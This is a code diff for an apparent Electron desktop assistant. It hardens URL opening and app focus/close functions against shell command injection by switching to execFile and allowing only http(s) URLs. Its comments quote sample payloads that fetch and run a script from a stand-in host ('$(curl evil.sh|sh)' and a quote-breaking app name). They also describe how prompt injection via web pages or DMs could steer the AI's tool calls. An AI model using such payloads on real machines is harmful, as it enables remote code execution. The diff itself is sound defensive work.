@@ -197,44 +197,77 @@ const BROWSER_FALLBACKS = {
 };
 
 // ─── CHROME PATHS per platform ────────────────────────────────────────────────
-function getChromeCommands(url) {
-  const safe = url.replace(/"/g, '%22');
+// How to start a browser on this machine: a program and its arguments, as
+// SEPARATE values, never one string handed to a shell.
+//
+// This used to build shell commands like:   open -a "Google Chrome" "<url>"
+// and run them with exec(), escaping only the double quote. On a Mac or Linux
+// the shell still expands $(…) and `…` INSIDE double quotes, so a URL such as
+//     https://example.com/$(curl evil.sh|sh)
+// ran the attacker's command. The AI's open_url passes URLs the model wrote,
+// and what the model writes can be steered by a web page or a DM it has read —
+// so that was code execution on someone's computer from a message.
+//
+// With execFile and an argument array there is no shell at all: the URL is one
+// argument, delivered byte for byte, and nothing in it is ever interpreted.
+function getChromeLaunchers(url) {
   if (IS_WIN) {
+    const local = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
     return [
-      `start "" chrome "${safe}"`,
-      `start "" "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" "${safe}"`,
-      `start "" "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" "${safe}"`,
-      `start "" "${os.homedir()}\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe" "${safe}"`,
+      ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [url]],
+      ['C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe', [url]],
+      [path.join(local, 'Google', 'Chrome', 'Application', 'chrome.exe'), [url]],
     ];
   }
   if (IS_MAC) {
     return [
-      `open -a "Google Chrome" "${safe}"`,
-      `open -a "Chromium" "${safe}"`,
-      `/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome "${safe}"`,
+      ['open', ['-a', 'Google Chrome', url]],
+      ['open', ['-a', 'Chromium', url]],
     ];
   }
-  // Linux
   return [
-    `google-chrome "${safe}"`,
-    `google-chrome-stable "${safe}"`,
-    `chromium-browser "${safe}"`,
-    `chromium "${safe}"`,
-    `xdg-open "${safe}"`,
+    ['google-chrome', [url]],
+    ['google-chrome-stable', [url]],
+    ['chromium-browser', [url]],
+    ['chromium', [url]],
+    ['xdg-open', [url]],
   ];
 }
 
-function openInChrome(url) {
+// Only web addresses go to a browser. Anything else — file:, javascript:,
+// ms-msdt: (the "Follina" exploit), search-ms:, or a scheme somebody's
+// installed app registered — is refused here; the few custom schemes the app
+// genuinely uses (whatsapp:, spotify: …) go through their own checked path.
+function safeWebUrl(raw) {
+  let u;
+  try { u = new URL(String(raw || '').trim()); } catch (_) { return null; }
+  if (u.protocol !== 'https:' && u.protocol !== 'http:') return null;
+  if (!u.hostname) return null;
+  return u.href;
+}
+
+function openInChrome(raw) {
   return new Promise((resolve) => {
-    const cmds = getChromeCommands(url);
+    const url = safeWebUrl(raw);
+    if (!url) {
+      console.warn('[openInChrome] refused a non-web address:', String(raw).slice(0, 80));
+      return resolve(false);
+    }
+    const launchers = getChromeLaunchers(url);
     const tryNext = (idx) => {
-      if (idx >= cmds.length) {
-        shell.openExternal(url).then(resolve).catch(resolve);
+      if (idx >= launchers.length) {
+        // No Chrome found. The default browser, via the OS — safe here because
+        // the address was checked above to be http(s) and nothing else.
+        shell.openExternal(url).then(() => resolve(true)).catch(() => resolve(false));
         return;
       }
-      exec(cmds[idx], (err) => {
+      const [file, args] = launchers[idx];
+      // Windows full paths: skip ones that are not there instead of waiting
+      // for an error from each.
+      if (IS_WIN && /\\/.test(file) && !fs.existsSync(file)) return tryNext(idx + 1);
+      execFile(file, args, { windowsHide: true }, (err) => {
         if (err) tryNext(idx + 1);
-        else resolve();
+        else resolve(true);
       });
     };
     tryNext(0);
@@ -1125,9 +1158,15 @@ function focusApp(app) {
       return;
     }
     if (IS_MAC) {
-      const safe = String(app.name).replace(/["\\]/g, '');
-      exec(`osascript -e 'tell application "System Events" to set frontmost of process "${safe}" to true'`,
-        { timeout: 5000 }, (err) => resolve(!err));
+      // The process name goes in as an ARGUMENT to the script, not as part of
+      // its text, and osascript is started directly rather than through a
+      // shell. See closeApp below for why that matters.
+      execFile('osascript', [
+        '-e', 'on run argv',
+        '-e', 'tell application "System Events" to set frontmost of process (item 1 of argv) to true',
+        '-e', 'end run',
+        String(app.name),
+      ], { timeout: 5000 }, (err) => resolve(!err));
       return;
     }
     resolve(false);
@@ -1154,21 +1193,45 @@ async function switchApp(direction) {
 
 // Closing. Asks the window to close rather than killing the process, so
 // anything unsaved still gets its chance to say so.
+// The name comes from the AI's close_app tool, so it is whatever the model
+// wrote — and what the model writes can be steered by a web page, a DM or a
+// skill it has read. It is therefore treated as hostile.
+//
+// This used to paste the name into a shell command. On a Mac the AppleScript
+// sat inside single quotes for sh, and only " and \ were removed — so a name
+// like   x'; curl evil.sh|sh; echo '   closed the quote and ran the
+// attacker's command. Now the name is never part of any code: it is an
+// ARGUMENT to osascript (read inside the script as argv) and an ENVIRONMENT
+// VARIABLE to PowerShell (read as $env:…), and no shell is involved at all.
 function closeApp(name) {
   return new Promise((resolve) => {
     const want = String(name || '').trim();
     if (!want) return resolve({ ok: false, error: 'Close what?' });
+    // Matching is "name contains", so a one- or two-letter name would close
+    // most of what is open. Anything that short is a mistake, not a request.
+    if (want.length < 3) return resolve({ ok: false, error: `Close which app? "${want}" is too short to be sure.` });
+    if (want.length > 80) return resolve({ ok: false, error: 'That is not an app name.' });
+
     if (IS_WIN) {
-      const safe = want.replace(/["'`$;&|<>]/g, '');
-      const ps = `Get-Process | Where-Object { ($_.ProcessName -like '*${safe}*' -or $_.MainWindowTitle -like '*${safe}*') `
-        + `-and $_.MainWindowTitle -ne '' } | ForEach-Object { $_.CloseMainWindow() | Out-Null }`;
-      exec(`powershell -NoProfile -Command "${ps}"`, { timeout: 8000, windowsHide: true }, (err) =>
-        resolve(err ? { ok: false, error: `I could not close ${want}.` } : { ok: true, closed: want }));
+      const ps = 'Get-Process | Where-Object { ($_.ProcessName -like ("*" + $env:CALLISTO_CLOSE + "*") '
+        + '-or $_.MainWindowTitle -like ("*" + $env:CALLISTO_CLOSE + "*")) -and $_.MainWindowTitle -ne "" } '
+        + '| ForEach-Object { $_.CloseMainWindow() | Out-Null }';
+      // -like treats [ ] * ? as wildcards; escaped so the name is matched as
+      // written rather than as a pattern.
+      const literal = want.replace(/[[\]*?`]/g, (c) => '`' + c);
+      execFile('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps], {
+        timeout: 8000, windowsHide: true,
+        env: { ...process.env, CALLISTO_CLOSE: literal },
+      }, (err) => resolve(err ? { ok: false, error: `I could not close ${want}.` } : { ok: true, closed: want }));
       return;
     }
     if (IS_MAC) {
-      const safe = want.replace(/["\\]/g, '');
-      exec(`osascript -e 'tell application "${safe}" to quit'`, { timeout: 8000 }, (err) =>
+      execFile('osascript', [
+        '-e', 'on run argv',
+        '-e', 'tell application (item 1 of argv) to quit',
+        '-e', 'end run',
+        want,
+      ], { timeout: 8000 }, (err) =>
         resolve(err ? { ok: false, error: `I could not close ${want}.` } : { ok: true, closed: want }));
       return;
     }
